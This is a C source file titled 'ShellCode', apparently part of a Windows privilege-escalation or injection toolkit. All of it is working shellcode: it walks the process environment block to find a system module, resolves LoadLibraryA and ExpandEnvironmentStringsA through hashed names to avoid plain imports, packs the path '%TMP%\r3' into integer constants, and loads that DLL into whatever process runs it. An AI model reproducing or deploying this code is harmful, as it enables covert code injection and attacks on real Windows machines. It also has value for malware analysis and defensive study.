/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.71
*
*  DATE:        25 Apr 2015
*
*  ShellCode.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

//disable nonmeaningful warnings.
#pragma warning(disable: 4005) // macro redefinition

#include <Windows.h>
#include "..\Shared\ntos.h"

typedef HMODULE(WINAPI *pfnLoadLibraryA)(LPCSTR lpLibFileName);
typedef DWORD(WINAPI *pfnExpandEnvironmentStringsA)(LPCSTR lpSrc, LPSTR lpDst, DWORD nSize);

DWORD gethash(char *s)
{
	DWORD h = 0;

	while (*s != 0) {
		h ^= *s;
		h = RotateLeft32(h, 3) + 1;
		s++;
	}

	return h;
}

PVOID rawGetProcAddress(PVOID Module, DWORD hash)
{
	PIMAGE_DOS_HEADER           dosh = (PIMAGE_DOS_HEADER)Module;
	PIMAGE_FILE_HEADER          fileh = (PIMAGE_FILE_HEADER)((PBYTE)dosh + sizeof(DWORD) + dosh->e_lfanew);
	PIMAGE_OPTIONAL_HEADER      popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
	DWORD                       ETableVA = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_EXPORT_DIRECTORY     pexp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dosh + ETableVA);
	PDWORD                      names = (PDWORD)((PBYTE)dosh + pexp->AddressOfNames), functions = (PDWORD)((PBYTE)dosh + pexp->AddressOfFunctions);
	PWORD                       ordinals = (PWORD)((PBYTE)dosh + pexp->AddressOfNameOrdinals);
	DWORD_PTR                   c, fp;

	for (c = 0; c < pexp->NumberOfNames; c++) {
		if (gethash((char *)((PBYTE)dosh + names[c])) == hash) {
			fp = functions[ordinals[c]];
			return (PBYTE)Module + fp;
		}
	}

	return NULL;
}

void main()
{
	PTEB                            teb = (PTEB)__readfsdword(0x18);
	PPEB                            peb = teb->ProcessEnvironmentBlock;
	PLDR_DATA_TABLE_ENTRY           ldre0 = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InLoadOrderModuleList.Flink;
	pfnLoadLibraryA                 xLoadLibraryA;
	pfnExpandEnvironmentStringsA    xExpandEnvironmentStringsA;
	CHAR                            libpath[MAX_PATH], c;
	DWORD	textbuf[3] = {
		'PMT%', '3r\\%', 0
	};

	for (c = 0; c < 2; c++)
		ldre0 = (PLDR_DATA_TABLE_ENTRY)ldre0->InLoadOrderLinks.Flink;

	xExpandEnvironmentStringsA = (pfnExpandEnvironmentStringsA)rawGetProcAddress(ldre0->DllBase, 0xf53890a2);
	xLoadLibraryA = (pfnLoadLibraryA)rawGetProcAddress(ldre0->DllBase, 0x69b37e08);

	xExpandEnvironmentStringsA((char *)&textbuf, libpath, sizeof(libpath));
	xLoadLibraryA(libpath);
}
